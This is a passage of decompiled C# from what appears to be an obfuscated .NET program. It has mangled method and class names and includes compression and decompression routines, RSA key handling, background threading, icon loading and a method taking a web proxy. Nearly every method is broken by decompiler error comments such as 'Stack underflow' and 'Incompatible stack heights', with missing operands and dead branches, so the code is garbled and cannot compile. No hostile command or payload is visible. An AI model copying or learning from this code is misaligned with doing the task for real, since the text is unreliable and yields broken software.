					_0011._0001((global::_0007._0005)/*Error near IL_001b: Stack underflow*/, (string)/*Error near IL_001b: Stack underflow*/, (global::_0008._0006)/*Error near IL_001b: Stack underflow*/);
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0008._0006 P_0, global::_0007._0005 P_1, string P_2, string P_3)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			global::_0002._000F obj = default(global::_0002._000F);
			try
			{
				do
				{
					obj = ((global::_0008._0006)/*Error near IL_0007: Stack underflow*/)._0001;
					if ((int)/*Error near IL_000d: Stack underflow*/ == 0)
					{
						return;
					}
				}
				while (false);
				new _000F((global::_0007._0005)/*Error near IL_0040: Stack underflow*/, (string)/*Error near IL_0040: Stack underflow*/, (string)/*Error near IL_0040: Stack underflow*/);
				/*Error near IL_0021: Stack underflow*/((object)/*Error near IL_0021: Stack underflow*/, (_000F)/*Error near IL_0021: Stack underflow*/);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj, (object)P_0, (object)P_1, (object)P_2, (object)P_3);
				throw;
			}
		}

		unsafe static void _0001(global::_0006._0001 _0002, [Out] int _0003, out string _0004, ref string P_3)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 2
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
			try
			{
				if (false)
				{
					return;
				}
				new RSACryptoServiceProvider((int)/*Error near IL_0067: Stack underflow*/);
				rSACryptoServiceProvider = (RSACryptoServiceProvider)/*Error near IL_006d: Stack underflow*/;
				try
				{
					_ = _0089_0002._007E_0006_0005;
					/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/, false);
					*(_003F*)(nint)/*Error near IL_001c: Stack underflow*/ = /*Error near IL_001c: Stack underflow*/;
					_ = _0089_0002._007E_0006_0005;
					/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/, true);
					*(_003F*)(nint)/*Error near IL_0029: Stack underflow*/ = /*Error near IL_0029: Stack underflow*/;
				}
				finally
				{
					while (7u != 0 && rSACryptoServiceProvider != null)
					{
						if (0 == 0)
						{
							global::_000F._007E_0099(rSACryptoServiceProvider);
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)rSACryptoServiceProvider, (object)_0002, (object)_0003, (object)_0004, (object)P_3);
				throw;
			}
		}

		static void _0001(int P_0, global::_0008._0004._0007 P_1, byte[] P_2, bool P_3, int P_4)
		{
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 2
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0071: Incompatible stack heights: 0 vs 2
			//IL_007b: Incompatible stack heights: 0 vs 1
			try
			{
				if (0 == 0)
				{
					_ = ((global::_0008._0004._0007)/*Error near IL_000a: Stack underflow*/)._0001;
					int num = (((int)/*Error near IL_000e: Stack underflow*/ != 0) ? 1 : 0);
					_0011._0001((global::_0008._0004._000E)/*Error near IL_0060: Stack underflow*/, num, 3);
				}
				_0011._0001(((global::_0008._0004._0007)/*Error near IL_001c: Stack underflow*/)._0001);
				if (0 == 0)
				{
					_ = ((global::_0008._0004._0007)/*Error near IL_0028: Stack underflow*/)._0001;
					_0011._0001((global::_0008._0004._000E)/*Error near IL_0078: Stack underflow*/, (int)/*Error near IL_0078: Stack underflow*/);
					goto IL_002e;
				}
				goto IL_004a;
				IL_004a:
				if (false)
				{
					goto IL_002e;
				}
				_0011._0001(P_1);
				return;
				IL_002e:
				_0011._0001(((global::_0008._0004._0007)/*Error near IL_0033: Stack underflow*/)._0001, ~P_4);
				_0011._0001(P_4, P_2, P_0, P_1._0001);
				goto IL_004a;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_1, (object)P_2, (object)P_0, (object)P_4, (object)P_3);
				throw;
			}
		}

		static bool _0001(global::_0008._0004._0002 P_0)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0008._0004._0002)/*Error near IL_0007: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0002)/*Error near IL_000e: Stack underflow*/)._0002;
				bool flag = (int)/*Error near IL_0010: Stack underflow*/ == num;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0028: Stack underflow*/ != 0;
		}

		unsafe static bool _0001(global::_0008._0004._0005 P_0, global::_0008._0004._0002 P_1)
		{
			//IL_0068: Unknown result type (might be due to invalid IL or missing references)
			//IL_02e2: Incompatible stack heights: 0 vs 1
			//IL_02e8: Incompatible stack heights: 0 vs 1
			//IL_02ee: Incompatible stack heights: 0 vs 1
			//IL_02f4: Incompatible stack heights: 0 vs 1
			//IL_02fa: Incompatible stack heights: 0 vs 1
			//IL_0304: Incompatible stack heights: 0 vs 1
			//IL_030a: Incompatible stack heights: 0 vs 1
			//IL_0310: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[17];
			int num2 = default(int);
			byte b = default(byte);
			int num4 = default(int);
			try
			{
				while (true)
				{
					int num = ((global::_0008._0004._0005)/*Error near IL_0019: Stack underflow*/)._0001;
					*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = num;
					switch (*(int*)(nint)/*Error near IL_0020: Stack underflow*/)
					{
					default:
						continue;
					case 0:
						_0011._0001((global::_0008._0004._0002)/*Error near IL_0304: Stack underflow*/, 5);
						((global::_0008._0004._0005)/*Error near IL_0054: Stack underflow*/)._0002 = (int)/*Error near IL_0054: Stack underflow*/;
						if (((global::_0008._0004._0005)/*Error near IL_005e: Stack underflow*/)._0002 < 0)
						{
							*(sbyte*)(nint)(/*Error near IL_0069: Stack underflow*/ + 16) = 0;
							goto end_IL_0014;
						}
						P_0._0002 += 257;
						_0011._0001(P_1, 5);
						P_0._0001 = 1;
						goto case 1;
					case 1:
						P_0._0003 = _0011._0001(P_1, 5);
						if (P_0._0003 < 0)
						{
							((byte*)ptr)[16] = 0;
							goto end_IL_0014;
						}
						P_0._0003++;
						_0011._0001(P_1, 5);
						P_0._0005 = P_0._0002 + P_0._0003;
						P_0._0002 = new byte[P_0._0005];
						P_0._0001 = 2;
						goto case 2;
					case 2:
						P_0._0004 = _0011._0001(P_1, 4);
						if (P_0._0004 < 0)
						{
							((byte*)ptr)[16] = 0;
							goto end_IL_0014;
						}
						P_0._0004 += 4;
						_0011._0001(P_1, 4);
						P_0._0001 = new byte[19];
						P_0._0007 = 0;
						P_0._0001 = 3;
						goto case 3;
					case 3:
						while (true)
						{
							if (P_0._0007 < P_0._0004)
							{
								*(int*)((byte*)ptr + 4) = _0011._0001(P_1, 3);
								if (*(int*)((byte*)ptr + 4) < 0)
								{
									((byte*)ptr)[16] = 0;
									goto end_IL_0014;
								}
								_0011._0001(P_1, 3);
								P_0._0001[global::_0008._0004._0005._0003[P_0._0007]] = (byte)(*(uint*)((byte*)ptr + 4));
								P_0._0007++;
								continue;
							}
							P_0._0001 = new global::_0008._0004._0004(P_0._0001);
							P_0._0001 = null;
							P_0._0007 = 0;
							P_0._0001 = 4;
							break;
						}
						goto case 4;
					case 4:
						while (true)
						{
							if (((num2 = _0011._0001(P_0._0001, P_1)) & -16) == 0)
							{
								byte[] array = P_0._0002;
								*(int*)((byte*)ptr + 8) = P_0._0007;
								P_0._0007 = *(int*)((byte*)ptr + 8) + 1;
								int num3 = *(int*)((byte*)ptr + 8);
								b = (P_0._0001 = (byte)num2);
								array[num3] = b;
								if (P_0._0007 == P_0._0005)
								{
									((byte*)ptr)[16] = 1;
									break;
								}
								continue;
							}
							if (num2 < 0)
							{
								((byte*)ptr)[16] = 0;
								break;
							}
							if (num2 >= 17)
							{
								P_0._0001 = 0;
							}
							P_0._0006 = num2 - 16;
							P_0._0001 = 5;
							goto end_IL_0020;
						}
						goto end_IL_0014;
					case 5:
						break;
						end_IL_0020:
						break;
					}
					*(int*)((byte*)ptr + 12) = global::_0008._0004._0005._0002[P_0._0006];
					num4 = _0011._0001(P_1, *(int*)((byte*)ptr + 12));
					if (num4 < 0)
					{
						((byte*)ptr)[16] = 0;
						break;
					}
					_0011._0001(P_1, *(int*)((byte*)ptr + 12));
					num4 += global::_0008._0004._0005._0001[P_0._0006];
					while (num4-- > 0)
					{
						byte[] array2 = P_0._0002;
						*(int*)((byte*)ptr + 8) = P_0._0007;
						P_0._0007 = *(int*)((byte*)ptr + 8) + 1;
						array2[*(int*)((byte*)ptr + 8)] = P_0._0001;
					}
					if (P_0._0007 == P_0._0005)
					{
						((byte*)ptr)[16] = 1;
						break;
					}
					P_0._0001 = 4;
					continue;
					end_IL_0014:
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)num2, (object)(*(int*)((byte*)ptr + 8)), (object)b, (object)(*(int*)((byte*)ptr + 12)), (object)num4, (object)P_0, (object)P_1);
				throw;
			}
			return ((byte*)ptr)[16] != 0;
		}

		static void _0001(global::_0003._0008 P_0)
		{
			//IL_0080: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_0092: Incompatible stack heights: 0 vs 1
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 1
			global::_0003._0008._0001 obj = default(global::_0003._0008._0001);
			try
			{
				if (4u != 0)
				{
					new global::_0003._0008._0001();
					obj = (global::_0003._0008._0001)/*Error near IL_0086: Stack underflow*/;
					if (4 == 0)
					{
						goto IL_0053;
					}
					if (1 == 0)
					{
						goto IL_0073;
					}
					((global::_0003._0008._0001)/*Error near IL_001f: Stack underflow*/)._0001 = (global::_0003._0008)/*Error near IL_001f: Stack underflow*/;
					if (global::_0003._0008._0001)
					{
						return;
					}
					_0011._0001();
					((global::_0003._0008._0001)/*Error near IL_002f: Stack underflow*/)._0001 = (_000E)/*Error near IL_002f: Stack underflow*/;
				}
				_ = global::_000F._007E_009F;
				Thread thread = new Thread(((global::_0003._0008._0001)/*Error near IL_0041: Stack underflow*/)._0001);
				thread.IsBackground = true;
				thread.SetApartmentState(ApartmentState.STA);
				/*Error near IL_00b6: Stack underflow*/((object)/*Error near IL_00b6: Stack underflow*/);
				goto IL_0053;
				IL_0073:
				global::_0003._0008._0001 = true;
				return;
				IL_0053:
				_008B_0002._007E_0008_0005(_001A_0002._0081_0004(), P_0._0001);
				goto IL_0073;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj, (object)P_0);
				throw;
			}
		}

		static void _0001()
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 2
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			try
			{
				try
				{
					_ = global::_0004._0019;
					global::_000E._0003._0001(107394001);
					_ = global::_0007._007E_008E;
					_008C_0002._0010_0005();
					/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/);
					/*Error near IL_003a: Stack underflow*/((string)/*Error near IL_003a: Stack underflow*/, (string)/*Error near IL_003a: Stack underflow*/);
					global::_0010._0006._0001((string)/*Error near IL_0041: Stack underflow*/);
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
		}

		unsafe static bool _0001(bool P_0, bool P_1, global::_0008._0004._0008 P_2)
		{
			//IL_002f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Unknown result type (might be due to invalid IL or missing references)
			//IL_031c: Incompatible stack heights: 0 vs 1
			//IL_0322: Incompatible stack heights: 0 vs 1
			//IL_0328: Incompatible stack heights: 0 vs 1
			//IL_032e: Incompatible stack heights: 0 vs 1
			//IL_0334: Incompatible stack heights: 0 vs 1
			//IL_033a: Incompatible stack heights: 0 vs 1
			//IL_0347: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[29];
			int num = default(int);
			bool flag = default(bool);
			try
			{
				if (((global::_0008._0004._0008)/*Error near IL_0014: Stack underflow*/)._0006 < 262 && (int)/*Error near IL_0028: Stack underflow*/ == 0)
				{
					*(sbyte*)(nint)(/*Error near IL_0030: Stack underflow*/ + 28) = 0;
				}
				else
				{
					while (true)
					{
						if (P_2._0006 >= 262 || P_1)
						{
							if (((global::_0008._0004._0008)/*Error near IL_0041: Stack underflow*/)._0006 == 0)
							{
								if (((global::_0008._0004._0008)/*Error near IL_0050: Stack underflow*/)._0001)
								{
									global::_0008._0004._0007 obj = ((global::_0008._0004._0008)/*Error near IL_005c: Stack underflow*/)._0001;
									*(int*)(nint)(/*Error near IL_0069: Stack underflow*/ + 16) = P_2._0001[P_2._0005 - 1] & 0xFF;
									_0011._0001(*(int*)((byte*)ptr + 16), obj);
								}
								P_2._0001 = false;
								global::_0008._0004._0007 obj2 = P_2._0001;
								byte[] array = P_2._0001;
								*(int*)((byte*)ptr + 12) = P_2._0004;
								*(int*)((byte*)ptr + 24) = P_2._0005 - P_2._0004;
								_0011._0001(*(int*)((byte*)ptr + 12), array, *(int*)((byte*)ptr + 24), P_0, obj2);
								P_2._0004 = P_2._0005;
								((byte*)ptr)[28] = 0;
								break;
							}
							if (P_2._0005 >= 65274)
							{
								_0011._0001(P_2);
							}
							*(int*)ptr = P_2._0002;
							num = P_2._0003;
							if (P_2._0006 >= 3)
							{
								*(int*)((byte*)ptr + 4) = _0011._0001(P_2);
								if (*(int*)((byte*)ptr + 4) != 0 && P_2._0005 - *(int*)((byte*)ptr + 4) <= 32506 && _0011._0001(P_2, *(int*)((byte*)ptr + 4)) && P_2._0003 <= 5 && P_2._0003 == 3 && P_2._0005 - P_2._0002 > 4096)
								{
									P_2._0003 = 2;
								}
							}
							if (num >= 3 && P_2._0003 <= num)
							{
								global::_0008._0004._0007 obj3 = P_2._0001;
								*(int*)((byte*)ptr + 20) = P_2._0005 - 1 - *(int*)ptr;
								_0011._0001(*(int*)((byte*)ptr + 20), num, obj3);
								num -= 2;
								do
								{
									P_2._0005++;
									P_2._0006--;
									if (P_2._0006 >= 3)
									{
										_0011._0001(P_2);
									}
								}
								while (--num > 0);
								P_2._0005++;
								P_2._0006--;
								P_2._0001 = false;
								P_2._0003 = 2;
							}
							else
							{
								if (P_2._0001)
								{
									global::_0008._0004._0007 obj = P_2._0001;
									*(int*)((byte*)ptr + 16) = P_2._0001[P_2._0005 - 1] & 0xFF;
									_0011._0001(*(int*)((byte*)ptr + 16), obj);
								}
								P_2._0001 = true;
								P_2._0005++;
								P_2._0006--;
							}
							if (_0011._0001(P_2._0001))
							{
								*(int*)((byte*)ptr + 8) = P_2._0005 - P_2._0004;
								if (P_2._0001)
								{
									(*(int*)((byte*)ptr + 8))--;
								}
								flag = P_0 && P_2._0006 == 0 && !P_2._0001;
								global::_0008._0004._0007 obj2 = P_2._0001;
								byte[] array = P_2._0001;
								*(int*)((byte*)ptr + 12) = P_2._0004;
								_0011._0001(*(int*)((byte*)ptr + 12), array, *(int*)((byte*)ptr + 8), flag, obj2);
								P_2._0004 += *(int*)((byte*)ptr + 8);
								((byte*)ptr)[28] = ((!flag) ? ((byte)1) : ((byte)0));
								break;
							}
							continue;
						}
						((byte*)ptr)[28] = 1;
						break;
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)num, (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)flag, (object)P_2, (object)P_1, (object)P_0);
				throw;
			}
			return ((byte*)ptr)[28] != 0;
		}

		unsafe static int _0001(global::_0008._0004._0007._0001 P_0)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0034: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Expected I4, but got Unknown
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 2
			//IL_006a: Incompatible stack heights: 0 vs 2
			//IL_006d: Incompatible stack heights: 0 vs 2
			//IL_0070: Incompatible stack heights: 0 vs 2
			byte* num = stackalloc byte[12];
			void* ptr;
			if (4u != 0)
			{
				ptr = num;
			}
			try
			{
				*(int*)(nint)/*Error near IL_0010: Stack underflow*/ = 0;
				*(int*)(nint)(/*Error near IL_0014: Stack underflow*/ + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < P_0._0001.Length)
				{
					_ = *(int*)(nint)/*Error near IL_001d: Stack underflow*/;
					_ = ((global::_0008._0004._0007._0001)/*Error near IL_0024: Stack underflow*/)._0001;
					int num2 = *(int*)(nint)(/*Error near IL_0028: Stack underflow*/ + 4);
					_ = ((short[])/*Error near IL_002a: Stack underflow*/)[num2];
					_ = ((global::_0008._0004._0007._0001)/*Error near IL_0031: Stack underflow*/)._0001;
					int num3 = *(int*)(nint)(/*Error near IL_0035: Stack underflow*/ + 4);
					byte num4 = ((byte[])/*Error near IL_0037: Stack underflow*/)[num3];
					_003F val = /*Error near IL_0038: Stack underflow*/* num4;
					_003F val2 = /*Error near IL_0039: Stack underflow*/+ val;
					*(int*)(nint)/*Error near IL_003a: Stack underflow*/ = (int)val2;
					(*(int*)((byte*)ptr + 4))++;
				}
				*(int*)((byte*)ptr + 8) = *(int*)ptr;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)P_0);
				throw;
			}
			return *(int*)((byte*)ptr + 8);
		}

		unsafe static global::_0008._0002 _0001(ref object _0002, string _0003, [Out] string _0004)
		{
			//IL_0029: Invalid comparison between Unknown and I4
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 4
			//IL_007f: Incompatible stack heights: 0 vs 1
			//IL_0095: Incompatible stack heights: 0 vs 1
			*(@null*)(nint)/*Error near IL_0007: Stack underflow*/ = null;
			try
			{
				_ = global::_0010._0003._0003;
				_ = 0;
				_ = 131097;
				_0011._0001((UIntPtr)/*Error near IL_007f: Stack underflow*/, (global::_0008._0003)/*Error near IL_007f: Stack underflow*/, (global::_0001._0005)/*Error near IL_007f: Stack underflow*/, (string)/*Error near IL_007f: Stack underflow*/, out global::_0008._0002 _);
				global::_0002._0003 obj2 = (global::_0002._0003)/*Error near IL_0085: Stack underflow*/;
				try
				{
					if (false ? true : false)
					{
						goto IL_003a;
					}
					if ((int)/*Error near IL_002b: Stack underflow*/ == -1)
					{
						goto IL_002b;
					}
					if ((int)/*Error near IL_003a: Stack underflow*/ != 0)
					{
						goto IL_003a;
					}
					if (false || 2 == 0)
					{
						goto IL_002b;
					}
					object obj3 = obj2._0001(_0004);
					*(object*)(nint)/*Error near IL_0052: Stack underflow*/ = obj3;
					goto end_IL_0020;
					IL_003a:
					if (0 == 0)
					{
						return global::_0008._0002._0001;
					}
					global::_0008._0002 result = default(global::_0008._0002);
					return result;
					IL_002b:
					return global::_0008._0002._0002;
					end_IL_0020:;
				}
				finally
				{
					if (obj2 != null)
					{
						global::_000F._007E_0099(obj2);
					}
				}
			}
			catch
			{
				return global::_0008._0002._0001;
			}
			return global::_0008._0002._0003;
		}

		static string _0001(global::_0002._0006._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0002._0006._0003)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static string _0001()
		{
			//IL_001e: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _008D_0002._007E_0011_0005;
				_0011._0001();
				global::_000E._0003._0001(107393968);
				CultureInfo cultureInfo = global::_0010._0001._0001;
				/*Error near IL_002c: Stack underflow*/((object)/*Error near IL_002c: Stack underflow*/, (string)/*Error near IL_002c: Stack underflow*/, cultureInfo);
				string text = (string)/*Error near IL_002f: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_003b: Stack underflow*/;
		}

		unsafe static int _0001(global::_0008._0004._0004 P_0, global::_0008._0004._0002 P_1)
		{
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Expected I4, but got Unknown
			//IL_013f: Incompatible stack heights: 0 vs 1
			//IL_0145: Incompatible stack heights: 0 vs 1
			//IL_014b: Incompatible stack heights: 0 vs 2
			//IL_0151: Incompatible stack heights: 0 vs 1
			//IL_0157: Incompatible stack heights: 0 vs 1
			//IL_0161: Expected I4, but got Unknown
			//IL_0167: Incompatible stack heights: 0 vs 1
			//IL_016d: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[20];
			int num = default(int);
			int num2 = default(int);
			try
			{
				if ((num = _0011._0001((global::_0008._0004._0002)/*Error near IL_0016: Stack underflow*/, 9)) >= 0)
				{
					_ = ((global::_0008._0004._0004)/*Error near IL_0028: Stack underflow*/)._0001;
					if ((num2 = ((short[])/*Error near IL_002e: Stack underflow*/)[/*Error near IL_002e: Stack underflow*/]) >= 0)
					{
						_003F val = /*Error near IL_0040: Stack underflow*/& 0xF;
						_0011._0001((global::_0008._0004._0002)/*Error near IL_0161: Stack underflow*/, (int)val);
						_ = /*Error near IL_004d: Stack underflow*/+ 16;
						_003F val2 = /*Error near IL_0054: Stack underflow*/>> 4;
						*(int*)(nint)/*Error near IL_0055: Stack underflow*/ = (int)val2;
					}
					else
					{
						*(int*)ptr = -(num2 >> 4);
						*(int*)((byte*)ptr + 4) = num2 & 0xF;
						if ((num = _0011._0001(P_1, *(int*)((byte*)ptr + 4))) >= 0)
						{
							num2 = P_0._0001[*(int*)ptr | (num >> 9)];
							_0011._0001(P_1, num2 & 0xF);
							*(int*)((byte*)ptr + 16) = num2 >> 4;
						}
						else
						{
							*(int*)((byte*)ptr + 8) = _0011._0001(P_1);
							while (true)
							{
								num = _0011._0001(P_1, *(int*)((byte*)ptr + 8));
								num2 = P_0._0001[*(int*)ptr | (num >> 9)];
								if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
								{
									_0011._0001(P_1, num2 & 0xF);
									if (5 == 0)
									{
										continue;
									}
									*(int*)((byte*)ptr + 16) = num2 >> 4;
									if (uint.MaxValue != 0)
									{
										break;
									}
								}
								*(int*)((byte*)ptr + 16) = -1;
								break;
							}
						}
					}
				}
				else
				{
					*(int*)((byte*)ptr + 12) = _0011._0001(P_1);
					num = _0011._0001(P_1, *(int*)((byte*)ptr + 12));
					num2 = P_0._0001[num];
					if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
					{
						_0011._0001(P_1, num2 & 0xF);
						*(int*)((byte*)ptr + 16) = num2 >> 4;
					}
					else
					{
						*(int*)((byte*)ptr + 16) = -1;
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)num2, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)P_0, (object)P_1);
				throw;
			}
			return *(int*)((byte*)ptr + 16);
		}

		static bool _0001(global::_0004._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0004._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static Icon _0001()
		{
			//IL_0027: Invalid comparison between Unknown and I4
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 2
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 2
			do
			{
				IntPtr zero = IntPtr.Zero;
				while (true)
				{
					IntPtr intPtr = zero;
					if (0 == 0)
					{
						zero = IntPtr.Zero;
						if (false)
						{
							continue;
						}
						IntPtr intPtr2 = zero;
						if (4u != 0)
						{
							_008E_0002._0012_0005();
							_0011._0001((string)/*Error near IL_0073: Stack underflow*/, -1, out intPtr2, out intPtr2, 1);
							if ((int)/*Error near IL_0029: Stack underflow*/ <= 0)
							{
								goto IL_005c;
							}
						}
						while (true)
						{
							_008E_0002._0012_0005();
							_0011._0001((string)/*Error near IL_0081: Stack underflow*/, 0, out intPtr, out intPtr2, 1);
							_ = _0080._0002_0003;
							IntPtr zero2 = IntPtr.Zero;
							/*Error near IL_008b: Stack underflow*/((IntPtr)/*Error near IL_008b: Stack underflow*/, zero2);
							if ((int)/*Error near IL_0049: Stack underflow*/ == 0)
							{
								break;
							}
							if (uint.MaxValue != 0)
							{
								goto end_IL_005e;
							}
						}
					}
					goto IL_005c;
					IL_005c:
					return null;
					continue;
					end_IL_005e:
					break;
				}
			}
			while (false);
			_ = _008F_0002._0014_0005;
			return /*Error near IL_005b: Stack underflow*/((IntPtr)/*Error near IL_005b: Stack underflow*/);
		}

		static string _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001();
				string text = (string)/*Error near IL_000e: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		static void _0001(byte[] P_0, global::_0008._0004._0008 P_1)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					((global::_0008._0004._0008)/*Error near IL_0009: Stack underflow*/)._0002 = (byte[])/*Error near IL_0009: Stack underflow*/;
					((global::_0008._0004._0008)/*Error near IL_0011: Stack underflow*/)._0008 = 0;
					IntPtr intPtr = (nint)((Array)/*Error near IL_0016: Stack underflow*/).LongLength;
					((global::_0008._0004._0008)/*Error near IL_001c: Stack underflow*/)._000E = (int)(nint)intPtr;
				}
				while (3 == 0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_1, (object)P_0);
				throw;
			}
		}

		static void _0001(_0008 P_0)
		{
			//IL_0050: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 2
			//IL_006d: Incompatible stack heights: 0 vs 2
			do
			{
				_ = _0084_0002._007E_0091_0004;
				Timer obj = ((_0008)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_0057: Stack underflow*/(obj, false);
			}
			while (false);
			if (7u != 0)
			{
				((_0008)/*Error near IL_001d: Stack underflow*/)._0001 = null;
				if (6u != 0)
				{
					if (false)
					{
						goto IL_0040;
					}
					((_0008)/*Error near IL_002b: Stack underflow*/)._0001 = false;
				}
				string empty = string.Empty;
				((_0008)/*Error near IL_0037: Stack underflow*/)._0001 = empty;
				goto IL_0037;
			}
			goto IL_0040;
			IL_0040:
			if (0 == 0)
			{
				_ = _0090_0002._0015_0005;
				/*Error near IL_0074: Stack underflow*/((object)/*Error near IL_0074: Stack underflow*/, 16);
				return;
			}
			goto IL_0037;
			IL_0037:
			_ = global::_000F._007E_0001_0002;
			/*Error near IL_006a: Stack underflow*/((object)/*Error near IL_006a: Stack underflow*/);
			goto IL_0040;
		}

		static string _0001()
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			try
			{
				global::_000E._0003._0001(107396732);
				_0011._0001((string)/*Error near IL_0019: Stack underflow*/);
				string text = (string)/*Error near IL_001c: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_0028: Stack underflow*/;
		}

		static void _0001(global::_0002._0007 P_0, IWebProxy P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
